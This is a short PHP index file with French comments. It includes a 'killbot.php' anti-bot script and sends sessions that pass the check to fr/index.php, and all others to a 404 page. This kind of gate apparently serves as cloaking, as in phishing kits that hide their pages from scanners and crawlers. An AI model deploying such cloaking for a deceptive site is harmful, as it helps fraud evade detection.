<?php
session_start();
include './server/killbot.php';   // Inclusion Fichier Killbot 

if (isset($_SESSION['killbot_autorisé']) && $_SESSION['killbot_autorisé'] ==  true) { 
    
    header ('Location: fr/index.php');  
    exit(); 
}
    
    else {
       header('Location: 404.php');  
        exit();
    }





?>